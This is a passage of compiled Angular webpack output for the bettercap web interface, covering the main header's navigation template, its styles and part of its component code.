        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_4__["ApiService"], _angular_forms__WEBPACK_IMPORTED_MODULE_3__["FormBuilder"], _angular_router__WEBPACK_IMPORTED_MODULE_2__["ActivatedRoute"], _angular_router__WEBPACK_IMPORTED_MODULE_2__["Router"]])
    ], LoginComponent);
    return LoginComponent;
}());



/***/ }),

/***/ "./src/app/components/main-header/main-header.component.html":
/*!*******************************************************************!*\
  !*** ./src/app/components/main-header/main-header.component.html ***!
  \*******************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<header id=\"uiMainHeader\" class=\"shadow-lg\">\n\n  <nav class=\"navbar navbar-dark bg-dark\">\n\n      <ul class=\"navbar-nav\">\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" routerLink=\"/events\">\n            <i class=\"fas fa-terminal\">\n              <span *ngIf=\"counters.events > 0\" class=\"badge badge-pill badge-danger\">{{ counters.events }}</span>\n            </i>\n            <span class=\"nav-text\">Events</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" [class.text-muted]=\"!api.module('net.recon').running\" routerLink=\"/lan\">\n            <i class=\"fa fa-network-wired\">\n              <span *ngIf=\"counters.hosts > 0\" class=\"badge badge-pill badge-danger\">{{ counters.hosts }}</span>\n            </i>\n            <span class=\"nav-text\">LAN</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" [class.text-muted]=\"!api.module('wifi').running\" routerLink=\"/wifi\">\n            <i class=\"fa fa-wifi\">\n              <span *ngIf=\"counters.aps > 0\" class=\"badge badge-pill badge-danger\">{{ counters.aps }}</span>\n            </i>\n            <span class=\"nav-text\">WiFi</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" [class.text-muted]=\"!api.module('ble.recon').running\" routerLink=\"/ble\">\n            <i class=\"fab fa-bluetooth-b\">\n              <span *ngIf=\"counters.ble > 0\" class=\"badge badge-pill badge-danger\">{{ counters.ble }}</span>\n            </i>\n            <span class=\"nav-text\">BLE</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" [class.text-muted]=\"!api.module('hid').running\" routerLink=\"/hid\">\n            <i class=\"fa fa-keyboard\">\n              <span *ngIf=\"counters.hid > 0\" class=\"badge badge-pill badge-danger\">{{ counters.hid }}</span>\n            </i>\n            <span class=\"nav-text\">HID</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" [class.text-muted]=\"!api.module('gps').running\" routerLink=\"/gps\">\n            <i class=\"fas fa-globe-europe\">\n              <span *ngIf=\"counters.gps > 0\" class=\"badge badge-pill badge-danger\">\n                <i class=\"fas fa-satellite\"></i>\n                {{ counters.gps }}\n              </span>\n            </i>\n            <span class=\"nav-text\">Position</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" routerLink=\"/caplets\">\n            <i class=\"fas fa-scroll\">\n              <span *ngIf=\"counters.caplets > 0\" class=\"badge badge-pill badge-danger\">{{ counters.caplets }}</span>\n            </i>\n            <span class=\"nav-text\">Caplets</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" *ngFor=\"let mod of api.settings.pinned.modules | keyvalue\" routerLinkActive=\"active\">\n          <a class=\"nav-link pinned\" \n             [class.text-muted]=\"!api.module(mod.key).running\"\n             routerLink=\"/advanced/{{ mod.key }}\" \n             ngbTooltip=\"{{ api.module(mod.key).description }}\" \n             placement=\"bottom\">\n            <i class=\"fa fa-{{ mod.key | modicon }}\"></i>\n            <span class=\"nav-text\">{{ mod.key }}</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item\" routerLinkActive=\"active\">\n          <a class=\"nav-link\" routerLink=\"/advanced\">\n            <i class=\"fa fa-cogs\">\n              <span *ngIf=\"counters.running > 0\" class=\"badge badge-pill badge-danger\">{{ counters.running }}</span>\n            </i>\n            <span class=\"nav-text\">Advanced</span>\n          </a>\n        </li>\n\n        <li class=\"nav-item right\">\n          <a style=\"cursor:pointer\" class=\"nav-link\" (click)=\"logout()\">\n            <i class=\"fas fa-sign-out-alt\"></i>\n            <span class=\"nav-text\">Logout</span>\n          </a>\n        </li>\n\n        <li *ngIf=\"!api.settings.omnibar\" class=\"nav-item right\">\n          <a class=\"nav-link\" style=\"cursor:pointer\" (click)=\"api.settings.omnibar = !api.settings.omnibar\">\n            <i class=\"fas fa-bars\"></i>\n            <span class=\"nav-text\">Omnibar</span>\n          </a>\n        </li>\n\n        <li *ngIf=\"rest.state.recording\" class=\"nav-item right replayDate\">\n          <span class=\"badge badge-pill badge-danger\">\n            <i class=\"fas fa-video\" style=\"margin-right:3px\"></i>\n            recording\n          </span>\n        </li>\n\n        <li *ngIf=\"rest.state.replaying\" class=\"nav-item right replayDate\">\n          <span class=\"badge badge-pill badge-danger\">\n            <i class=\"fas fa-video\" style=\"margin-right:3px\"></i>\n            {{ api.session.polled_at | date:'medium' }}\n          </span>\n        </li>\n\n      </ul>\n\n  </nav>\n\n  <omnibar></omnibar>\n</header>\n\n<div *ngIf=\"sessionError\" id=\"sessionError\">\n  <div class=\"alert alert-danger\" role=\"alert\">\n    <h5 class=\"alert-heading\">ERROR</h5>\n    <p class=\"mb-0\">\n      {{ sessionError.message }}\n    </p>\n  </div>\n</div>\n\n<div *ngIf=\"api.settings.Warning()\" id=\"sslWarning\">\n  <div class=\"alert alert-danger\" role=\"alert\">\n    <h5 class=\"alert-heading\">WARNING</h5>\n    <p class=\"mb-0\">\n    {{ api.settings.URL() }} is using an <strong>insecure connection</strong>, refer to <a href=\"https://www.bettercap.org/modules/core/api.rest/#parameters\" target=\"_blank\">the documentation</a> to configure the api.rest module to use SSL.<br/>\n    </p>\n  </div>\n</div>\n\n<div id=\"commandError\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"commandErrorTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header error-header\">\n        <div class=\"modal-title error-title\" id=\"commandErrorTitle\">\n          <h5>Error</h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body error-body\" *ngIf=\"commandError\">\n        <i class=\"fas fa-exclamation-triangle\" style=\"font-size:4rem; width: 100%; text-align:center\"></i>\n        <br/>\n        <br/>\n        {{ commandError.error | unbash }}\n      </div>\n    </div>\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/main-header/main-header.component.scss":
/*!*******************************************************************!*\
  !*** ./src/app/components/main-header/main-header.component.scss ***!
  \*******************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "/* Colors */\n/* Fonts */\n/* Colors */\n/* Fonts */\n.mono {\n  font-family: \"Roboto Mono\", monospace;\n}\n.btn-action {\n  font-weight: 100;\n  font-size: 0.8rem;\n  white-space: nowrap;\n  padding: 0.05rem 0.3rem;\n  line-height: 1;\n  border-radius: 0.1rem;\n}\n.btn-tiny {\n  font-size: 0.7rem !important;\n}\nbutton.btn-event {\n  font-size: 0.8rem;\n  padding: 0.05rem 0.3rem;\n  line-height: 1;\n  border-radius: 0.1rem;\n}\n.navbar {\n  padding: 0.2rem 0;\n}\n@media (min-width: 768px) {\n  .navbar {\n    padding: 0.5rem 0;\n  }\n}\n.navbar .navbar-nav {\n  display: block;\n  width: 100%;\n}\n.navbar .navbar-nav li.nav-item {\n  float: left;\n  margin-left: 5px;\n}\n@media (min-width: 768px) {\n  .navbar .navbar-nav li.nav-item {\n    margin-left: 10px;\n  }\n}\n.navbar .navbar-nav li.nav-item:first {\n  margin-left: 0px;\n}\n.navbar .navbar-nav li.right {\n  float: right;\n  margin-left: 0;\n  margin-right: 10px;\n}\n.navbar .navbar-nav .nav-link {\n  text-align: center;\n  display: table-cell;\n  vertical-align: middle;\n  padding-top: 0;\n  padding-bottom: 0;\n  height: 50px;\n}\n@media (min-width: 768px) {\n  .navbar .navbar-nav .nav-link {\n    height: 70px;\n  }\n}\n.navbar .navbar-nav .nav-link .nav-text {\n  display: none;\n}\n@media (min-width: 768px) {\n  .navbar .navbar-nav .nav-link .nav-text {\n    display: inline;\n  }\n}\n.navbar .navbar-nav .nav-link > *[class^=fa] {\n  display: block;\n  position: relative;\n  width: 48px;\n  font-size: 24px;\n  top: 0;\n  margin: 2px auto 4px auto;\n  line-height: 24px;\n}\n.navbar .navbar-nav .nav-link > *[class^=fa] .badge {\n  font-size: 0.75rem;\n  position: absolute;\n  right: 0;\n  top: -7px;\n  font-family: sans-serif;\n}\n#sessionError {\n  padding: 5px;\n  background-color: #343a40;\n}\ndiv.error-header {\n  background-color: #d2322d;\n  color: white;\n  border-bottom: 1px solid #c2221d;\n}\ndiv.error-body {\n  text-align: center;\n}\n.toast-bootstrap-compatibility-fix {\n  opacity: 1;\n}\ndiv.toast-message {\n  font-size: 10rem !important;\n}\n.navbar-dark .navbar-nav .active > .nav-link, .navbar-dark .navbar-nav .nav-link.active, .navbar-dark .navbar-nav .nav-link.show, .navbar-dark .navbar-nav .show > .nav-link {\n  text-shadow: 0 2px 5px rgba(0, 0, 0, 0.26), 0 2px 5px rgba(0, 0, 0, 0.33);\n}\nli.replayDate {\n  padding-top: 40px;\n  font-size: 0.8rem;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvbWFpbi1oZWFkZXIvbWFpbi1oZWFkZXIuY29tcG9uZW50LnNjc3MiLCIvVXNlcnMvZXZpbHNvY2tldC9CYWhhbXV0L0xhYi9iZXR0ZXJjYXAvdWkvc3JjL3BhcnRpYWxzL2J1dHRvbnMuc2NzcyIsInNyYy9hcHAvY29tcG9uZW50cy9tYWluLWhlYWRlci9tYWluLWhlYWRlci5jb21wb25lbnQuc2NzcyIsIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zdGRpbiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxXQUFBO0FBUUEsVUFBQTtBQVJBLFdBQUE7QUFRQSxVQUFBO0FDTkE7RUFDSSxxQ0FBQTtBQ0dKO0FEQUE7RUFFSSxnQkFBQTtFQUNBLGlCQUFBO0VBQ0EsbUJBQUE7RUFDQSx1QkFBQTtFQUNBLGNBQUE7RUFDQSxxQkFBQTtBQ0VKO0FEQ0E7RUFDSSw0QkFBQTtBQ0VKO0FEQ0E7RUFDSSxpQkFBQTtFQUNBLHVCQUFBO0VBQ0EsY0FBQTtFQUNBLHFCQUFBO0FDRUo7QUN2QkE7RUFDSSxpQkFBQTtBRDBCSjtBQ3hCSTtFQUhKO0lBSVEsaUJBQUE7RUQyQk47QUFDRjtBQ3pCSTtFQUNJLGNBQUE7RUFDQSxXQUFBO0FEMkJSO0FDekJRO0VBQ0ksV0FBQTtFQUNBLGdCQUFBO0FEMkJaO0FDekJZO0VBSko7SUFLUSxpQkFBQTtFRDRCZDtBQUNGO0FDMUJZO0VBQ0ksZ0JBQUE7QUQ0QmhCO0FDeEJRO0VBQ0ksWUFBQTtFQUNBLGNBQUE7RUFDQSxrQkFBQTtBRDBCWjtBQ3RCSTtFQUNJLGtCQUFBO0VBQ0EsbUJBQUE7RUFDQSxzQkFBQTtFQUNBLGNBQUE7RUFDQSxpQkFBQTtFQUNBLFlBQUE7QUR3QlI7QUN0QlE7RUFSSjtJQVNRLFlBQUE7RUR5QlY7QUFDRjtBQ3ZCUTtFQUNJLGFBQUE7QUR5Qlo7QUN4Qlk7RUFGSjtJQUdRLGVBQUE7RUQyQmQ7QUFDRjtBQ3hCUTtFQUNJLGNBQUE7RUFDQSxrQkFBQTtFQUNBLFdBQUE7RUFDQSxlQUFBO0VBQ0EsTUFBQTtFQUNBLHlCQUFBO0VBQ0EsaUJBQUE7QUQwQlo7QUN4Qlk7RUFDSSxrQkFBQTtFQUNBLGtCQUFBO0VBQ0EsUUFBQTtFQUNBLFNBQUE7RUFDQSx1QkFBQTtBRDBCaEI7QUNuQkE7RUFDSSxZQUFBO0VBQ0EseUJBQUE7QURzQko7QUNuQkE7RUFDSSx5QkFBQTtFQUNBLFlBQUE7RUFDQSxnQ0FBQTtBRHNCSjtBQ2ZBO0VBQ0ksa0JBQUE7QURrQko7QUNkQTtFQUNFLFVBQUE7QURpQkY7QUNkQTtFQUNJLDJCQUFBO0FEaUJKO0FDUEE7RUFDSSx5RUFBQTtBRFVKO0FDUEE7RUFDSSxpQkFBQTtFQUNBLGlCQUFBO0FEVUoiLCJmaWxlIjoic3JjL2FwcC9jb21wb25lbnRzL21haW4taGVhZGVyL21haW4taGVhZGVyLmNvbXBvbmVudC5zY3NzIiwic291cmNlc0NvbnRlbnQiOlsiLyogQ29sb3JzICovXG4kbWFpbkJhY2tncm91bmQ6IHJnYmEoMzgsNDUsNTMsMC45NSk7XG4kYWNpZE9yYW5nZTogI0ZENUYwMDtcbiRuZXRCbHVlOiM0MTY5RTE7XG4kYm9yZGVyQ29sb3JMaWdodDojMzEzMTMxO1xuJGFjaWRHcmVlbjojOTVEODU1O1xuJGRhcmtSZWQ6I2JmMDAwMDtcblxuLyogRm9udHMgKi9cbiRmb250RmFtaWx5UHJpbWFyeTogXCJOdW5pdG9cIiwgLWFwcGxlLXN5c3RlbSwgQmxpbmtNYWNTeXN0ZW1Gb250LCBcIlNlZ29lIFVJXCIsIFJvYm90bywgXCJIZWx2ZXRpY2EgTmV1ZVwiLCBBcmlhbCwgc2Fucy1zZXJpZiwgXCJBcHBsZSBDb2xvciBFbW9qaVwiLCBcIlNlZ29lIFVJIEVtb2ppXCIsIFwiU2Vnb2UgVUkgU3ltYm9sXCIsICdOb3RvIENvbG9yIEVtb2ppJyAhZGVmYXVsdDtcbiRmb250V2VpZ2h0Tm9ybWFsOjQwMDtcbiRmb250U2l6ZTouOXJlbTtcbiRsaW5lSGVpZ2h0OjEuNXJlbTtcbiIsIkBpbXBvcnQgXCJ2YXJpYWJsZXNcIjtcblxuLm1vbm8ge1xuICAgIGZvbnQtZmFtaWx5OiAnUm9ib3RvIE1vbm8nLCBtb25vc3BhY2U7XG59XG5cbi5idG4tYWN0aW9uIHtcbiAgICAvLyBjb2xvcjogI2QwZDBkMDtcbiAgICBmb250LXdlaWdodDogMTAwO1xuICAgIGZvbnQtc2l6ZTogLjhyZW07XG4gICAgd2hpdGUtc3BhY2U6IG5vd3JhcDtcbiAgICBwYWRkaW5nOiAuMDVyZW0gLjNyZW07XG4gICAgbGluZS1oZWlnaHQ6IDEuMDtcbiAgICBib3JkZXItcmFkaXVzOiAuMXJlbTtcbn1cblxuLmJ0bi10aW55IHtcbiAgICBmb250LXNpemU6IC43cmVtICFpbXBvcnRhbnQ7XG59XG5cbmJ1dHRvbi5idG4tZXZlbnQge1xuICAgIGZvbnQtc2l6ZTogLjhyZW07XG4gICAgcGFkZGluZzogLjA1cmVtIC4zcmVtO1xuICAgIGxpbmUtaGVpZ2h0OiAxLjA7XG4gICAgYm9yZGVyLXJhZGl1czogLjFyZW07XG59XG4iLCIvKiBDb2xvcnMgKi9cbi8qIEZvbnRzICovXG4vKiBDb2xvcnMgKi9cbi8qIEZvbnRzICovXG4ubW9ubyB7XG4gIGZvbnQtZmFtaWx5OiBcIlJvYm90byBNb25vXCIsIG1vbm9zcGFjZTtcbn1cblxuLmJ0bi1hY3Rpb24ge1xuICBmb250LXdlaWdodDogMTAwO1xuICBmb250LXNpemU6IDAuOHJlbTtcbiAgd2hpdGUtc3BhY2U6IG5vd3JhcDtcbiAgcGFkZGluZzogMC4wNXJlbSAwLjNyZW07XG4gIGxpbmUtaGVpZ2h0OiAxO1xuICBib3JkZXItcmFkaXVzOiAwLjFyZW07XG59XG5cbi5idG4tdGlueSB7XG4gIGZvbnQtc2l6ZTogMC43cmVtICFpbXBvcnRhbnQ7XG59XG5cbmJ1dHRvbi5idG4tZXZlbnQge1xuICBmb250LXNpemU6IDAuOHJlbTtcbiAgcGFkZGluZzogMC4wNXJlbSAwLjNyZW07XG4gIGxpbmUtaGVpZ2h0OiAxO1xuICBib3JkZXItcmFkaXVzOiAwLjFyZW07XG59XG5cbi5uYXZiYXIge1xuICBwYWRkaW5nOiAwLjJyZW0gMDtcbn1cbkBtZWRpYSAobWluLXdpZHRoOiA3NjhweCkge1xuICAubmF2YmFyIHtcbiAgICBwYWRkaW5nOiAwLjVyZW0gMDtcbiAgfVxufVxuLm5hdmJhciAubmF2YmFyLW5hdiB7XG4gIGRpc3BsYXk6IGJsb2NrO1xuICB3aWR0aDogMTAwJTtcbn1cbi5uYXZiYXIgLm5hdmJhci1uYXYgbGkubmF2LWl0ZW0ge1xuICBmbG9hdDogbGVmdDtcbiAgbWFyZ2luLWxlZnQ6IDVweDtcbn1cbkBtZWRpYSAobWluLXdpZHRoOiA3NjhweCkge1xuICAubmF2YmFyIC5uYXZiYXItbmF2IGxpLm5hdi1pdGVtIHtcbiAgICBtYXJnaW4tbGVmdDogMTBweDtcbiAgfVxufVxuLm5hdmJhciAubmF2YmFyLW5hdiBsaS5uYXYtaXRlbTpmaXJzdCB7XG4gIG1hcmdpbi1sZWZ0OiAwcHg7XG59XG4ubmF2YmFyIC5uYXZiYXItbmF2IGxpLnJpZ2h0IHtcbiAgZmxvYXQ6IHJpZ2h0O1xuICBtYXJnaW4tbGVmdDogMDtcbiAgbWFyZ2luLXJpZ2h0OiAxMHB4O1xufVxuLm5hdmJhciAubmF2YmFyLW5hdiAubmF2LWxpbmsge1xuICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gIGRpc3BsYXk6IHRhYmxlLWNlbGw7XG4gIHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7XG4gIHBhZGRpbmctdG9wOiAwO1xuICBwYWRkaW5nLWJvdHRvbTogMDtcbiAgaGVpZ2h0OiA1MHB4O1xufVxuQG1lZGlhIChtaW4td2lkdGg6IDc2OHB4KSB7XG4gIC5uYXZiYXIgLm5hdmJhci1uYXYgLm5hdi1saW5rIHtcbiAgICBoZWlnaHQ6IDcwcHg7XG4gIH1cbn1cbi5uYXZiYXIgLm5hdmJhci1uYXYgLm5hdi1saW5rIC5uYXYtdGV4dCB7XG4gIGRpc3BsYXk6IG5vbmU7XG59XG5AbWVkaWEgKG1pbi13aWR0aDogNzY4cHgpIHtcbiAgLm5hdmJhciAubmF2YmFyLW5hdiAubmF2LWxpbmsgLm5hdi10ZXh0IHtcbiAgICBkaXNwbGF5OiBpbmxpbmU7XG4gIH1cbn1cbi5uYXZiYXIgLm5hdmJhci1uYXYgLm5hdi1saW5rID4gKltjbGFzc149ZmFdIHtcbiAgZGlzcGxheTogYmxvY2s7XG4gIHBvc2l0aW9uOiByZWxhdGl2ZTtcbiAgd2lkdGg6IDQ4cHg7XG4gIGZvbnQtc2l6ZTogMjRweDtcbiAgdG9wOiAwO1xuICBtYXJnaW46IDJweCBhdXRvIDRweCBhdXRvO1xuICBsaW5lLWhlaWdodDogMjRweDtcbn1cbi5uYXZiYXIgLm5hdmJhci1uYXYgLm5hdi1saW5rID4gKltjbGFzc149ZmFdIC5iYWRnZSB7XG4gIGZvbnQtc2l6ZTogMC43NXJlbTtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICByaWdodDogMDtcbiAgdG9wOiAtN3B4O1xuICBmb250LWZhbWlseTogc2Fucy1zZXJpZjtcbn1cblxuI3Nlc3Npb25FcnJvciB7XG4gIHBhZGRpbmc6IDVweDtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzM0M2E0MDtcbn1cblxuZGl2LmVycm9yLWhlYWRlciB7XG4gIGJhY2tncm91bmQtY29sb3I6ICNkMjMyMmQ7XG4gIGNvbG9yOiB3aGl0ZTtcbiAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNjMjIyMWQ7XG59XG5cbmRpdi5lcnJvci1ib2R5IHtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xufVxuXG4udG9hc3QtYm9vdHN0cmFwLWNvbXBhdGliaWxpdHktZml4IHtcbiAgb3BhY2l0eTogMTtcbn1cblxuZGl2LnRvYXN0LW1lc3NhZ2Uge1xuICBmb250LXNpemU6IDEwcmVtICFpbXBvcnRhbnQ7XG59XG5cbi5uYXZiYXItZGFyayAubmF2YmFyLW5hdiAuYWN0aXZlID4gLm5hdi1saW5rLCAubmF2YmFyLWRhcmsgLm5hdmJhci1uYXYgLm5hdi1saW5rLmFjdGl2ZSwgLm5hdmJhci1kYXJrIC5uYXZiYXItbmF2IC5uYXYtbGluay5zaG93LCAubmF2YmFyLWRhcmsgLm5hdmJhci1uYXYgLnNob3cgPiAubmF2LWxpbmsge1xuICB0ZXh0LXNoYWRvdzogMCAycHggNXB4IHJnYmEoMCwgMCwgMCwgMC4yNiksIDAgMnB4IDVweCByZ2JhKDAsIDAsIDAsIDAuMzMpO1xufVxuXG5saS5yZXBsYXlEYXRlIHtcbiAgcGFkZGluZy10b3A6IDQwcHg7XG4gIGZvbnQtc2l6ZTogMC44cmVtO1xufSIsIkBpbXBvcnQgXCJ2YXJpYWJsZXNcIjtcbkBpbXBvcnQgXCJidXR0b25zXCI7XG5cbi5uYXZiYXIge1xuICAgIHBhZGRpbmc6IC4ycmVtIDA7XG5cbiAgICBAbWVkaWEgKG1pbi13aWR0aDogNzY4cHgpIHtcbiAgICAgICAgcGFkZGluZzogLjVyZW0gMDtcbiAgICB9XG5cbiAgICAubmF2YmFyLW5hdiB7XG4gICAgICAgIGRpc3BsYXk6IGJsb2NrO1xuICAgICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgICBsaS5uYXYtaXRlbSB7XG4gICAgICAgICAgICBmbG9hdDogbGVmdDtcbiAgICAgICAgICAgIG1hcmdpbi1sZWZ0OiA1cHg7XG4gICAgICAgICAgICBcbiAgICAgICAgICAgIEBtZWRpYSAobWluLXdpZHRoOiA3NjhweCkge1xuICAgICAgICAgICAgICAgIG1hcmdpbi1sZWZ0OiAxMHB4O1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAmOmZpcnN0IHtcbiAgICAgICAgICAgICAgICBtYXJnaW4tbGVmdDogMHB4O1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIFxuICAgICAgICBsaS5yaWdodCB7XG4gICAgICAgICAgICBmbG9hdDogcmlnaHQ7XG4gICAgICAgICAgICBtYXJnaW4tbGVmdDogMDtcbiAgICAgICAgICAgIG1hcmdpbi1yaWdodDogMTBweDtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIC5uYXZiYXItbmF2IC5uYXYtbGluayB7XG4gICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICAgICAgZGlzcGxheTogdGFibGUtY2VsbDtcbiAgICAgICAgdmVydGljYWwtYWxpZ246IG1pZGRsZTtcbiAgICAgICAgcGFkZGluZy10b3A6IDA7XG4gICAgICAgIHBhZGRpbmctYm90dG9tOiAwO1xuICAgICAgICBoZWlnaHQ6IDUwcHg7XG5cbiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6IDc2OHB4KSB7XG4gICAgICAgICAgICBoZWlnaHQ6IDcwcHg7XG4gICAgICAgIH1cblxuICAgICAgICAubmF2LXRleHQge1xuICAgICAgICAgICAgZGlzcGxheTogbm9uZTtcbiAgICAgICAgICAgIEBtZWRpYSAobWluLXdpZHRoOiA3NjhweCkge1xuICAgICAgICAgICAgICAgIGRpc3BsYXk6IGlubGluZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuXG4gICAgICAgICYgPiAqW2NsYXNzXj0nZmEnXSB7XG4gICAgICAgICAgICBkaXNwbGF5OiBibG9jaztcbiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTtcbiAgICAgICAgICAgIHdpZHRoOiA0OHB4O1xuICAgICAgICAgICAgZm9udC1zaXplOiAyNHB4O1xuICAgICAgICAgICAgdG9wOiAwO1xuICAgICAgICAgICAgbWFyZ2luOiAycHggYXV0byA0cHggYXV0bztcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAyNHB4O1xuXG4gICAgICAgICAgICAuYmFkZ2Uge1xuICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMC43NXJlbTtcbiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgICAgICAgICAgICAgcmlnaHQ6IDA7XG4gICAgICAgICAgICAgICAgdG9wOiAtN3B4O1xuICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuXG59XG5cbiNzZXNzaW9uRXJyb3Ige1xuICAgIHBhZGRpbmc6IDVweDtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzQzYTQwO1xufVxuXG5kaXYuZXJyb3ItaGVhZGVyIHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZDIzMjJkO1xuICAgIGNvbG9yOiB3aGl0ZTtcbiAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgI2MyMjIxZDtcbn1cblxuZGl2LmVycm9yLXRpdGxlIHtcblxufVxuXG5kaXYuZXJyb3ItYm9keSB7XG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xufVxuXG4vLyBodHRwczovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy81Mzk4OTQ0NS9uZ3gtdG9hc3RyLXRvYXN0LW5vdC1zaG93aW5nLWluLWFuZ3VsYXItN1xuLnRvYXN0LWJvb3RzdHJhcC1jb21wYXRpYmlsaXR5LWZpeCB7XG4gIG9wYWNpdHk6MTtcbn1cblxuZGl2LnRvYXN0LW1lc3NhZ2Uge1xuICAgIGZvbnQtc2l6ZTogMTByZW0gIWltcG9ydGFudDtcbn1cblxuLnBpbm5lZDphZnRlciB7XG4gICAgLy8gZm9udC1mYW1pbHk6ICdGb250IEF3ZXNvbWUgNSBGcmVlJztcbiAgICAvLyBmb250LXdlaWdodDogOTAwO1xuICAgIC8vIGNvbnRlbnQ6ICdcXGYwOGQnO1xufVxuXG4vLyBvdmVycmlkZSB0ZXh0LW11dGVkXG4ubmF2YmFyLWRhcmsgLm5hdmJhci1uYXYgLmFjdGl2ZT4ubmF2LWxpbmssIC5uYXZiYXItZGFyayAubmF2YmFyLW5hdiAubmF2LWxpbmsuYWN0aXZlLCAubmF2YmFyLWRhcmsgLm5hdmJhci1uYXYgLm5hdi1saW5rLnNob3csIC5uYXZiYXItZGFyayAubmF2YmFyLW5hdiAuc2hvdz4ubmF2LWxpbmsge1xuICAgIHRleHQtc2hhZG93OiAwIDJweCA1cHggcmdiYSgwLDAsMCwwLjI2KSwgMCAycHggNXB4IHJnYmEoMCwwLDAsMC4zMyk7XG59XG5cbmxpLnJlcGxheURhdGUge1xuICAgIHBhZGRpbmctdG9wOiA0MHB4OyBcbiAgICBmb250LXNpemU6IC44cmVtO1xufVxuIl19 */"

/***/ }),

/***/ "./src/app/components/main-header/main-header.component.ts":
/*!*****************************************************************!*\
  !*** ./src/app/components/main-header/main-header.component.ts ***!
  \*****************************************************************/
/*! exports provided: MainHeaderComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "MainHeaderComponent", function() { return MainHeaderComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var ngx_toastr__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ngx-toastr */ "./node_modules/ngx-toastr/fesm5/ngx-toastr.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _event_event_component__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../event/event.component */ "./src/app/components/event/event.component.ts");






var MainHeaderComponent = /** @class */ (function () {
    function MainHeaderComponent(api, router, toastr, resolver, injector) {
        this.api = api;
        this.router = router;
        this.toastr = toastr;
        this.resolver = resolver;
        this.injector = injector;
        this.apiFirstUpdate = true;
        this.rest = null;
        this.counters = {
            events: 0,
            hosts: 0,
            aps: 0,
            ble: 0,
            hid: 0,
            gps: 0,
            caplets: 0,
            running: 0
        };
        this.subscriptions = [];
        this.modNotificationCache = {};
        this.updateSession(this.api.session);
        this.updateEvents(this.api.events, true);
    }
    MainHeaderComponent.prototype.skipError = function (error) {
        return false;
    };
    MainHeaderComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.subscriptions = [
            this.api.onNewData.subscribe(function (session) {
                _this.updateSession(session);
            }),
            this.api.onNewEvents.subscribe(function (events) {
                _this.updateEvents(events, _this.apiFirstUpdate);
